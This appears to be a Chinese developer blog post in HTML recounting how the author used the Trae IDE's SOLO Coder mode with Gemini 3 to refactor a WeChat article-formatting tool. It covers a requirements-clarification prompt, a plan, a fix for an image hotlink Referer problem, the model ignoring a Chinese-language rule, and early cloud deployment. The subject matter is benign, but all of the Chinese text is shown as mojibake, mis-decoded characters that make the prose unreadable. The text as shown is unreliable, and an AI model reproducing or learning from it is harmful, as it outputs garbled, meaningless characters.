<p>å…·ä½“ Vibe è¿‡ç¨‹å¯ä»¥çœ‹ â†’ <a href="https://juejin.cn/post/7514260735938248719" target="_blank" title="https://juejin.cn/post/7514260735938248719">ã€Trae + æ˜é‡‘MCPã€‘ä¸å†™ä»£ç ï¼Œé å˜´éèŠ±0.5hå®šåˆ¶å…¬å·æ’ç‰ˆå·¥å…·</a></p>
<p>ğŸ¤” çŸ­æ–‡ç« è¿˜å¥½ï¼Œ<strong>é•¿æ–‡ç« æ ·å¼å…¨ä¹±å¥—</strong> (æ¯”å¦‚ï¼šæ— åºåˆ—è¡¨åŠ ç²—æ–‡æœ¬ï¼Œä¼šæ˜¾ç¤ºæˆ <strong>xx</strong>)ï¼Œæ¢äº†å¥½å‡ ä¸ªæ¨¡å‹ï¼Œ<strong>Vibe</strong> äº†Næ¬¡éƒ½æ²¡æ”¹å¥½ï¼Œé—®é¢˜è¶Šæè¶Šå¤šï¼Œå‰ç«¯è¿™å—ï¼Œæˆ‘åˆä¸æ˜¯å¾ˆç†Ÿï¼Œæ— å¥ˆæ”¾å¼ƒğŸ¤·â€â™€ï¸ã€‚åé¢è¿˜æ˜¯ç”¨å›äº†ã€Œ<strong>Doocs</strong>ã€ï¼š</p>
<ul>
<li><strong>å¼€æºGithubä»“åº“</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdoocs%2Fmd" target="_blank" title="https://github.com/doocs/md" ref="nofollow noopener noreferrer">doocs/md</a></li>
<li><strong>åœ¨çº¿ç¼–è¾‘å™¨åœ°å€</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmd.doocs.org%2F" target="_blank" title="https://md.doocs.org/" ref="nofollow noopener noreferrer">doocs</a></li>
</ul>
<p>ğŸ˜³ èƒ½ç”¨ï¼Œä½†æ˜¯æœ‰ç‚¹è¿‡äº <strong>ç®€æ´</strong> (æ˜¾å¾—å¹³å¹³æ— å¥‡)ï¼Œæˆ‘æ›´æ€€å¿µä»¥å‰ <strong>è‡ªå·±ç¼–æ’çš„UIæ ·å¼</strong> ...</p>
<p>å‰é˜µå­ <strong>Google</strong> å‘å¸ƒäº†åƒå‘¼ä¸‡å”¤çš„ "<strong>å“ˆåŸºç±³3</strong> (<strong>Geimni</strong>)"ï¼Œå›½å†… <strong>è‡ªåª’ä½“</strong> éƒ½æ˜¯åœ¨å¹å®ƒçš„ "<strong>å‰ç«¯èƒ½åŠ›</strong>" (çœ‹æ•ˆæœå›¾ç¡®å®æŒº6)ï¼š</p>
<ul>
<li><strong>èƒ½ç”Ÿæˆç²¾ç¡®çš„ SVG çŸ¢é‡å›¾</strong>ï¼šåŒ…æ‹¬å¤æ‚çš„åŠ¨ç”» SVG (å¦‚ï¼šæ—‹è½¬é£æ‰‡åŠ¨ç”»)ï¼Œè€Œéç®€å•æ …æ ¼å›¾ã€‚</li>
<li><strong>3D å’ŒåŠ¨ç”»</strong>ï¼šæ”¯æŒç”Ÿæˆ Three.js 3D æ¨¡å‹ã€WebGL ç€è‰²å™¨ã€CSS åŠ¨ç”»ç­‰é«˜çº§è§†è§‰æ•ˆæœã€‚</li>
<li><strong>å®Œæˆåº”ç”¨æ¡†æ¶</strong>ï¼šèƒ½ç†è§£å¤æ‚çš„æŠ€æœ¯æ ˆè¦æ±‚ (Reactã€Three.js Fiberã€TypeScript ç­‰)ï¼Œç”Ÿæˆæ¨¡å—åŒ–ã€ç»“æ„æ¸…æ™°çš„ä»£ç ã€‚</li>
<li><strong>æ ‡æ³¨ä¿®æ”¹</strong>ï¼šç”¨æˆ·å¯ä»¥åœ¨ç”Ÿæˆçš„ç•Œé¢ä¸Šç”¨ "æ ‡æ³¨" çš„æ–¹å¼æŒ‡å‡ºè¦ä¿®æ”¹çš„åœ°æ–¹ (ç”»åœˆã€ç”»ç®­å¤´ã€æ·»åŠ æ–‡å­—)ï¼ŒGemini 3 ä¼šç†è§£è¿™äº›è§†è§‰æ ‡æ³¨å¹¶ç²¾ç¡®ä¿®æ”¹ä»£ç ã€‚è¿™å¾—ç›Šäºå®ƒ å¤šæ¨¡æ€ç†è§£èƒ½åŠ›çš„æ˜¾è‘—æå‡ (å¯¹å±å¹•æˆªå›¾çš„ç†è§£å‡†ç¡®ç‡è¾¾åˆ° 72.7%ï¼Œè¾¾åˆ°ç°æœ‰æ°´å¹³çš„ä¸¤å€)ã€‚</li>
<li><strong>å» "AIå‘³"</strong> ï¼šæ’ç‰ˆã€è‰²å½©æ­é…ã€ç»„ä»¶ç»“æ„çœ‹èµ·æ¥æ˜¯ "ç²¾å¿ƒè®¾è®¡" çš„ï¼Œè€Œéç”Ÿç¡¬åœ°å¥—æ¨¡ç‰ˆã€‚</li>
</ul>
<p>ğŸ˜„ è™½è¯´ï¼Œè¿˜åŒæ—¶å‘å¸ƒäº†é¦–ä¸ª<strong>AI IDE</strong>â€”â€” <strong>Antigravity</strong> (åé‡åŠ›)ï¼Œä½† "<strong>ç™»å½•é—®é¢˜</strong>" å°±æ‹¦ä½äº†ä¸€å †äººï¼Œç„¶åå„ç§ <strong>BUG</strong>ï¼Œ+ <strong>å­˜åœ¨æ•°æ®æ³„éœ²é£é™©</strong>ï¼Œæ‰€ä»¥å½“æ—¶å¹¶æ²¡æ·±åº¦ä½“éªŒ <strong>Gemini 3</strong> çš„ç¼–ç¨‹èƒ½åŠ›åˆ°åº•æ˜¯ä¸æ˜¯çœŸçš„é‚£ä¹ˆå¼º ğŸ¤·â€â™€ï¸ã€‚</p>
<p>ğŸ˜ ç„¶åï¼Œå‰é˜µå­ "<strong>é‡å¤§ç®¡é¥±</strong>" çš„ <strong>Trae</strong> å‘å¸ƒå…¬å‘Šï¼š"<strong>å› æœåŠ¡ä¸­æ–­ï¼Œåœæ­¢æä¾› Claude æ¨¡å‹çš„è®¿é—®</strong>"ï¼Œå·§äº†ï¼Œåˆšå¥½æ¢ä¸Š <strong>Gemini 3</strong>ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5cdb879526b8462db92b5eb4b4f9cdda~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=%2FyAqu5deeKTD7xeeMxBPxhcrARg%3D" alt="" loading="lazy"/></p>
<p>çœ‹æ›´æ–°æ—¥å¿—ï¼Œ<strong>v3.0.0</strong> è¿™ä¸ªå¤§ç‰ˆæœ¬çš„æ–°ä¸œè¥¿è¿˜æŒºå¤šï¼š</p>
<ul>
<li>ã€Œ<strong>SOLO æ¨¡å¼æ­£å¼ä¸Šçº¿ï¼Œé¢å‘æ‰€æœ‰ç”¨æˆ·å¼€æ”¾</strong>ã€ä¸»æ‰“å•äººé«˜æ•ˆç‡å¼€å‘å·¥ä½œæµï¼Œè®©ç”¨æˆ·èƒ½åœ¨ä¸€ä¸ªç•Œé¢å¤„ç†ä»»åŠ¡ã€ä»£ç ã€æ™ºèƒ½ä½“åä½œã€‚</li>
<li>ã€Œ<strong>å†…ç½®ä¸¤ç±»æ™ºèƒ½ä½“èƒ½åŠ›å‡çº§</strong>ã€<strong>SOLO Coder</strong> - ä¸“ç²¾å¤æ‚å·¥ç¨‹ä»»åŠ¡ï¼šé‡æ„ã€è°ƒè¯•ã€å¤šæ–‡ä»¶è·¨æ¨¡å—ä¿®æ”¹ï¼Œå…·å¤‡æŒç»­ä¸Šä¸‹æ–‡ç†è§£èƒ½åŠ›ï¼Œæ›´é€‚åˆä¸­å¤§å‹é¡¹ç›®ã€‚<strong>SOLO Builder</strong> - ä¸ºå¿«é€Ÿæ„å»ºäº§å“åŸå‹è€Œè®¾è®¡ï¼šç•Œé¢ã€åº”ç”¨ã€åç«¯éƒ½èƒ½å¿«é€Ÿäº§å‡ºåˆç‰ˆï¼Œæ”¯æŒä» 0â†’1 çš„è‡ªåŠ¨åŒ– Scaffold (è„šæ‰‹æ¶) ä¸é€»è¾‘ç”Ÿæˆã€‚</li>
<li>å¼•å…¥ã€Œ<strong>å¤šä»»åŠ¡ç³»ç»Ÿ</strong>ã€<strong>å¹¶è¡Œ</strong>-å¯åœ¨åŒä¸€æ™ºèƒ½ä½“ä¸­åŒæ—¶å¤„ç†å¤šä¸ªä»»åŠ¡çº¿ç¨‹ã€<strong>æ‹†è§£</strong>-AI è‡ªåŠ¨è¯†åˆ«å¤æ‚ä»»åŠ¡å¹¶æ‹†åˆ†å­ä»»åŠ¡ã€<strong>æŠ˜å /å±•å¼€</strong>-æ›´æ¸…æ™°çš„é¡¹ç›®ç®¡ç†ç»“æ„ã€<strong>è‡ªåŠ¨ç”Ÿæˆæ‘˜è¦</strong>-èŠå¤©/æ“ä½œå†å²è‡ªåŠ¨å‹ç¼©æˆå¯è¯»æ‘˜è¦ï¼Œä¾¿äºå¿«é€Ÿå›é¡¾ã€‚</li>
<li>ã€Œ<strong>Diff View</strong>ã€é›†ä¸­å±•ç¤ºæ‰€æœ‰ç”± AI æˆ–ç”¨æˆ·ç”Ÿæˆçš„ä»£ç å˜æ›´ï¼Œæ”¯æŒè·¨æ–‡ä»¶æ¯”è¾ƒä¸ç‰ˆæœ¬å›æº¯ï¼ŒAI æ”¹åŠ¨æ›´é€æ˜ã€‚</li>
</ul>
<p>ğŸ˜† è¡Œå§ï¼Œæœ¬èŠ‚å°±å°è¯•ä¸‹ç”¨ <strong>TRAE SOLO + Gemini 3</strong> è®©è¿™ä¸ªæ—§é¡¹ç›®é‡æ–°ç„•å‘å…‰å½©å§âœ¨~</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c4e619834c24f01a011db06a3922ac8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=7Za8Y36WwCF8sbMqDgsDwn6725c%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>ğŸ’¡ å› ä¸ºæ˜¯é‡æ„æ—§é¡¹ç›®ï¼Œæ‰€ä»¥é€‰çš„ <strong>SOLO Coder</strong></p>
</blockquote>
<h2 data-id="heading-1">2. å®è·µè¿‡ç¨‹</h2>
<p><strong>åŸå§‹éœ€æ±‚</strong></p>
<p>æˆ‘æƒ³é‡æ„è¿™ä¸ªé¡¹ç›®ï¼Œæ”¹é€ æˆå¯ä»¥éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šçš„åœ¨çº¿äº§å“ï¼Œç±»ä¼¼äº <a href="https://link.juejin.cn?target=https%3A%2F%2Fmd.doocs.org%2F" target="_blank" title="https://md.doocs.org/" ref="nofollow noopener noreferrer">md.doocs.org/</a></p>
<p>è¿™åªæ˜¯ä¸ª "<strong>æ–¹å‘</strong>"ï¼Œè¿˜ä¸æ˜¯ "<strong>å¯æ‰§è¡Œéœ€æ±‚</strong>"ï¼Œé€šè¿‡ä¸‹è¿° <strong>Prompt</strong> è®© <strong>Trae</strong> å¼•å¯¼æˆ‘ä»¬è¿›è¡Œ "<strong>éœ€æ±‚æ¾„æ¸…</strong>"ï¼š</p>
<pre><code class="hljs language-md" lang="md">è¯·ä½ å…ˆä¸è¦å†™ä»£ç ï¼Œå…ˆæ‰®æ¼”æœ‰ç»éªŒçš„äº§å“ç»ç† + æ¶æ„å¸ˆï¼Œå¸®åŠ©æˆ‘æŠŠéœ€æ±‚è®²æ¸…æ¥šï¼Œè¾“å‡ºä¸€ä»½ç®€è¦éœ€æ±‚è¯´æ˜ã€‚å…·ä½“è¯·æŒ‰ä¸‹é¢æ­¥éª¤æ¥åšï¼š

1ï¼‰å…ˆç”¨ä½ è‡ªå·±çš„è¯å¤è¿°ä¸€ä¸‹æˆ‘ç°åœ¨çš„ç›®æ ‡ï¼Œçœ‹ä½ æ˜¯å¦ç†è§£å‡†ç¡®ï¼›

2ï¼‰ä»ç›®æ ‡ç”¨æˆ·ã€æ ¸å¿ƒåŠŸèƒ½ï¼ˆMVPï¼‰ã€éåŠŸèƒ½éœ€æ±‚ï¼ˆæ€§èƒ½ã€éƒ¨ç½²æ–¹å¼ï¼‰ã€æŠ€æœ¯æ ˆåå¥½ç­‰ç»´åº¦ï¼Œåˆ—å‡ºä½ éœ€è¦å‘æˆ‘ç¡®è®¤çš„å…³é”®é—®é¢˜ï¼›

3ï¼‰æŒ‰â€œå¿…é¡»å…ˆå›ç­” / ä¹‹åå†è¯´â€åšä¼˜å…ˆçº§æ’åºï¼Œæ¯ä¸ªé—®é¢˜å°½é‡ç®€æ´ï¼›

4ï¼‰æœ€åæŠŠè¿™äº›é—®é¢˜æ•´ç†æˆä¸€ä¸ªåˆ—è¡¨ï¼Œæ–¹ä¾¿æˆ‘é€æ¡å›ç­”ã€‚

æ³¨æ„ï¼šè¿™ä¸€è½®åªåšéœ€æ±‚æ¾„æ¸…ï¼Œä¸è¦è®¾è®¡æ¥å£ã€ä¸å†™ä»£ç ä¹Ÿä¸è¦ç»™æ–‡ä»¶ç»“æ„ï¼Œåªè¾“å‡ºå¤è¿° + é—®é¢˜åˆ—è¡¨ã€‚
</code></pre>
<p><strong>Trae</strong> çš„è¾“å‡ºï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d43092064e394487b0e74670c1646a59~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=onfeWbbVqBuK7xAIg0JVx1tKhgo%3D" alt="" loading="lazy"/></p>
<p>ğŸ˜³ å§æ§½ï¼Œå¾ˆå¤šç‚¹éƒ½è¯´åˆ°æˆ‘çš„ "â¤ï¸<strong>è¶´</strong>" ä¸Šäº†ï¼ŒåŸºäºå®ƒç»™å‡ºçš„ "<strong>å›ç­”åˆ—è¡¨</strong>" è¿›è¡Œ "<strong>å®Œå½¢å¡«ç©º</strong>"ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a6a5ba5a9c94d6a91dc7efbd4b0f1e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=iz%2FAdmIL3ekN6t1Y60OTJQd9fdY%3D" alt="" loading="lazy"/></p>
<p>å‘é€ç­‰Traeæ€è€ƒå®Œï¼Œç»™æˆ‘ç”Ÿæˆäº†ä¸€ä»½ "<strong>é‡æ„è®¡åˆ’</strong>" çš„æ–‡æ¡£ (ğŸ’¡è®°å¾—å¼€å¯å³ä¸Šè§’çš„ <strong>Plan</strong> é€‰é¡¹)ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9ad6522d2af43a693deb59f44897b33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=teAcuUOqskkEmk62ulw5tK4kvXo%3D" alt="" loading="lazy"/></p>
<p>ğŸ‘ æ–‡æ¡£å†™å¾— "<strong>å¤´å¤´æ˜¯é“</strong>"ï¼Œä¸‰å¤§å—ï¼š<strong>æ¶æ„è®¾è®¡</strong>ã€<strong>å®æ–½æ­¥éª¤</strong> å’Œ <strong>ç›®å½•ç»“æ„è§„åˆ’</strong> éƒ½å†™å¾—å¾ˆæ¸…æ™°ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e0d16b436944a468143cdf9222b3e4e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=0Mt3qQIZKp%2FX6qxDt4Q966oWMTI%3D" alt="" loading="lazy"/></p>
<p>æŒ‰éœ€è¿›è¡Œä¿®æ”¹ï¼Œç¡®å®šæ— è¯¯åï¼Œç‚¹è§£ "<strong>æ‰§è¡Œ</strong>"ï¼Œç„¶å <strong>Trae</strong> ä¼šæ‹†è§£æˆå¤šä¸ªå°ä»»åŠ¡ (Todo-List)ï¼Œé€ä¸€å®Œæˆï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/442e392308cb48b791a25e41895fa6e3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=T3bPg4Ye0vN6U01KrjaN6Hgx03k%3D" alt="" loading="lazy"/></p>
<p>å¯¹äº "<strong>é«˜é£é™©å‘½ä»¤</strong>" (æ¯”å¦‚è¿™é‡Œçš„ <strong>move</strong>)ï¼Œä¼šåœæ­¢å¾€ä¸‹æ‰§è¡Œï¼Œç­‰å¾…ç”¨æˆ· <strong>å®¡æ ¸ç¡®è®¤</strong>ã€‚ğŸ˜® Wow Human in Loopï½</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/898115478d624d8bb17980f16bda710f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=hpFAczmG5Jv3E2ImwCbOGuw7P%2B4%3D" alt="" loading="lazy"/></p>
<p>ğŸ˜„ æ¥ç€æœ€å°åŒ–è®© <strong>Trae</strong> åœ¨åå°å¹²æ´»ï¼Œéœ€è¦ <strong>äººå·¥ä»‹å…¥</strong> çš„èŠ‚ç‚¹ï¼Œå³ä¸‹è§’ä¼šæœ‰å¼¹çª—æç¤ºã€‚æ²¡è¿‡å¤šä¹…ï¼ŒTrae å°±è·Ÿæˆ‘è¯´å®ƒå®Œæˆäº†ï¼ä¸æ˜¯ï¼Œè¿™ä¹ˆå¿«çš„å—ï¼Ÿï¼Ÿï¼Ÿè®©å®ƒç»™æˆ‘æŠŠé¡¹ç›®è·‘èµ·æ¥ï¼Œç„¶åè¿™ "<strong>å‰ç«¯é¡µé¢</strong>" è¿˜æ•´å¾—æŒºåƒæ¨¡åƒæ ·ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/636d5201be224906882e32985ebc3b20~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=gyii12LLrMzSTyPZ5dlSD%2By1UPg%3D" alt="" loading="lazy"/></p>
<p>ğŸ¤£ åé¢å‘ç°ï¼Œå…¶å®å°±æ­äº†ä¸ª <strong>åŸºæœ¬éª¨æ¶</strong>ï¼Œå¾ˆå¤šä¸œè¥¿æ²¡åšï¼Œæ¥ç€å°±æ˜¯ "<strong>éªŒæ”¶ + Vibeæé—®é¢˜</strong>"ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fc9c9d2ac7f49beb5b237ca3073b6f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=nTH%2BPIKzO9X3F4H2vZR76uiZd1k%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2cdf406f8503405594075d94509b61f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=6x7AWIXKWOY5CIScnKtkA0UOwBM%3D" alt="" loading="lazy"/></p>
<p>ç»§ç»­ <strong>Vibe</strong>ï¼Œå‘ç°å›¾ç‰‡åŠ è½½ä¸å‡ºæ¥ï¼ŒğŸ˜„ è¿™ç§å¤§æ¦‚ç‡æ˜¯ "<strong>å›¾ç‰‡é˜²ç›—é“¾</strong>"ï¼Œä¸€èˆ¬æ˜¯æ£€æŸ¥ <strong>è¯·æ±‚å¤´</strong> ä¸­çš„ <strong>Referer</strong>ï¼Œå¦‚æœæ˜¯ <strong>ç¬¬ä¸‰æ–¹åŸŸå</strong>ï¼Œå°±ä¼šè¿”å› <strong>403</strong>ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd8bc414313c46e8ad5e42d03622db5b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=%2BrQddYBR4FyhfArPmlbfgYqlp1I%3D" alt="" loading="lazy"/></p>
<p>å› ä¸ºæ˜ç¡®æŒ‡å‡ºäº† "<strong>ç—…å› </strong>"ï¼ŒTrae ä¸¤ä¸‹å°±æ”¹å¥½äº†ï¼Œå¹¶è¯¦ç»†è®²è¿°äº† <strong>ä¿®å¤æ–¹æ¡ˆ</strong> &amp; <strong>éªŒè¯æ–¹æ³•</strong>ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68aa8bf4071e487a823ae64419a08112~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=3eoC1e3GQcsml2d%2BLMJuJolZ9CI%3D" alt="" loading="lazy"/></p>
<p>ğŸ‘ ä¸å¾—ä¸è¯´ <strong>Diff View</strong> ç¡®å®ç›´è§‚å•Šï¼ŒğŸ˜† æ¯” <strong>Cursor</strong> å®¹æ˜“çœ‹å¤šäº†~</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c212e724f8d645478b495257a8e07c11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=peR0fHs%2Fae%2Fw%2FjomFKv7HrH4G5Q%3D" alt="" loading="lazy"/></p>
<p>åˆ·æ–°ä¸‹é¡µé¢ï¼Œæœç„¶å¯ä»¥äº†ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60d5f44ba02c4da9955effd7950745ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=Qwvh5r2odVm%2FCIULfttnD2SMlKs%3D" alt="" loading="lazy"/></p>
<p>ç»§ç»­ <strong>Vibe</strong>ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d70665c0f2d340b893cdd3531bed5b16~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=VORJDOa%2F5oAagn17cPbFPf8NQyk%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19581a2222b44b6fb41d220c90ac4a17~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=OecmsGd%2FFSbJzDKMdKtnuHcEzFY%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/44f17a3fbc8b4693bb7946ea59f8ad5b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=bYA6Gu6EcMhzXNFpSwxXM6PBLwU%3D" alt="" loading="lazy"/></p>
<p>åœ¨ <strong>Battle</strong> å¤šæ¬¡åï¼Œ<strong>Trae</strong> è¯´è‡ªå·±å®Œæˆä»»åŠ¡ï¼Œå¹¶å‘ŠçŸ¥æˆ‘ "<strong>ä¸‹ä¸€æ­¥çš„éƒ¨ç½²å»ºè®®</strong>"ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eeede1a10c5f4a4f8428eb01a30fc990~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=ynyrtqpcRDh18eV6uF2aRDWCs38%3D" alt="" loading="lazy"/></p>
<p>è¿˜ç”Ÿæˆäº†ä¸€ä»½ "<strong>ä»»åŠ¡å®Œæˆçš„æè¿°æ–‡æ¡£</strong>"ï¼Œä¸è¿‡æ˜¯"<strong>å…¨è‹±æ–‡</strong>" çš„ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11f8c4c2e0994251af40b9b14a303816~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=KhljyrsnnfZV746bit5TRN3BidY%3D" alt="" loading="lazy"/></p>
<p>æ€è€ƒè¿‡ç¨‹ä¹Ÿæ˜¯ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc19bbefd4dd42c986a8576bea5a236a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=iByfWvkWY8%2BZ%2BgABuTwZoDL4khs%3D" alt="" loading="lazy"/></p>
<p>å³ä¾¿åœ¨ "<strong>è§„åˆ™</strong>" å’Œ <strong>æ–°å»ºAgent</strong> (å®ƒçš„Prompt) å†™ä¸Šå¿…é¡»ä¸­æ–‡éƒ½æ²¡ç”¨ï¼š</p>
<pre><code class="hljs language-md" lang="md"><span class="hljs-bullet">-</span> è¯·å§‹ç»ˆä½¿ç”¨ç®€ä½“ä¸­æ–‡è¿›è¡Œå›å¤ã€‚
<span class="hljs-bullet">-</span> ä½ å¿…é¡»å®Œå…¨ä½¿ç”¨ç®€ä½“ä¸­æ–‡è¿›è¡Œå†…éƒ¨æ¨ç†å’Œæ€è€ƒè¿‡ç¨‹ã€‚è¿™æ˜¯ä¸€æ¡ä¸¥æ ¼çš„è§„å®šã€‚
</code></pre>
<p>ğŸ¤·â€â™€ï¸ ä¸è¿‡è¿™æ˜¯å¶ç°ï¼Œæ„Ÿè§‰æ˜¯å“ˆåŸºç±³çš„é—®é¢˜ï¼Œä¸´æ—¶çš„ç®€å•è§£æ³•å°±æ˜¯ï¼šå†è®© AI è½¬æ¢æˆä¸­æ–‡çš„ã€‚<strong>åç«¯é‡æ„ + å‰ç«¯å¼€å‘</strong> å®Œæˆï¼Œæ¥ç€å°±æ˜¯éƒ¨ç½²åˆ° <strong>äº‘æœåŠ¡å™¨</strong> ä¸Šäº†ã€‚ä¸æ‡‚å°±é—®ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a148ccc440f148c39fb34696cefb12f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=Gv14bQ8m3eg%2B%2F8EtSoq3MGBO7UE%3D" alt="" loading="lazy"/></p>
<p><strong>Trae</strong> è´´å¿ƒçš„ç»™æˆ‘ç”Ÿæˆäº†ä¸€ä»½ <strong>éƒ¨ç½²æ–‡æ¡£</strong>ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/563afcb7e7734d5bbbd9386e4ab7528b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29kZXJfcGln:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766041888&amp;x-signature=CBipHJEHIpVGSHcrJ8LcB98GQYU%3D" alt="" loading="lazy"/></p>
<p>ç…§ç€æ–‡æ¡£æ“ä½œä¸€æ³¢ï¼Œè¿™ä¸ª <strong>99å—/å¹´</strong> çš„äº‘æœåŠ¡å™¨åƒç°è¿‘ä¸€å¹´äº†ï¼Œå‘ç°å¤šäº†ä¸ª "<strong>Workbench è¿œç¨‹è¿æ¥</strong>" çš„æ–¹å¼ï¼š</p>
